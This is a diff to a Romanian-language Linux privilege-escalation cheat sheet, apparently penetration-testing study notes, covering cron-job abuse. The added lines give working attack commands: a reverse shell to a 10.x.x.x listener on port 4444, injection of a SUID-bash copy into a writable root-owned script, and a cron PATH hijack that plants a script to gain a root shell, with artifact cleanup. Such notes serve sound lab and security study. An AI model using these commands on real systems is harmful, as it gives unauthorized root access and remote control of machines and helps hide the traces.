@@ -117,7 +117,7 @@ id
 ## 6. Cron Jobs PrivEsc & Netcat Listener
 
 ### Mecanism & Vulnerabilitate
-Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*), un atacator poate injecta propriile comenzi în acel fișier. Când cron-ul rulează la intervalul stabilit, comenzile se vor executa direct cu drepturi de `root`.
+Task-urile din cron rulează strict cu permisiunile utilizatorului care le deține (al 6-lea câmp din crontab). Dacă un cronjob este deținut de `root`, dar scriptul executat are permisiuni de scriere pentru utilizatori obișnuiți (*world-writable*) sau dacă variabila `PATH` este configurată nesigur, un atacator poate obține execuție de comenzi cu drepturi depline de `root`.
 
 ### Inspectare Cron Jobs
 cat /etc/crontab
@@ -137,15 +137,36 @@ Semnificația flag-urilor:
 * -l: Listen. Pornește modul server/ascultare pentru conexiuni noi.
 * -p: Port. Definește numărul portului pe care ascultă listener-ul.
 
-### Exploatare Script Writable
-1. Deschide un listener pe mașina ta:
-nc -nvlp 4444
-
-2. Injectează un Reverse Shell sau acordare bit SUID în scriptul rulat de root:
+### Metoda 1: Exploatare Script Writable (Permisiuni Slabe)
+1. Injectează un payload care creează o copie de bash cu bit SUID:
 echo "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash" >> /usr/local/bin/backup.sh
+
+2. Sau injectează un Reverse Shell către listener-ul de pe mașina ta de atac:
+echo "bash -i >& /dev/tcp/10.x.x.x/4444 0>&1" >> /usr/local/bin/backup.sh
 
 3. După ce minutul s-a scurs și cron-ul a rulat comanda:
 /tmp/rootbash -p
 id
 * Output așteptat: uid=0(root) gid=0(root) groups=0(root)
 
+### Metoda 2: Cron PATH Hijacking
+Apare când în `/etc/crontab` variabila `PATH` începe cu un director la care utilizatorul are acces de scriere (ex: `PATH=/home/user:...`), iar comanda apelată este relativă (ex: `overwrite.sh` în loc de calea completă `/usr/local/bin/overwrite.sh`).
+
+1. Creează scriptul malițios direct în folderul prioritar (/home/user):
+cat << 'EOF' > /home/user/overwrite.sh
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+EOF
+
+2. Fă fișierul executabil:
+chmod +x /home/user/overwrite.sh
+
+3. Așteaptă rularea cron-ului (sub 1 minut) și rulează binarul cu SUID:
+/tmp/rootbash -p
+* chmod +xs: Fiind rulat de root, binarul /tmp/rootbash va aparține lui root și va avea SUID setat.
+* -p: Privileged mode (împiedică bash să renunțe la privilegiile de root).
+
+4. Curățare artefacte:
+rm /tmp/rootbash
+exit
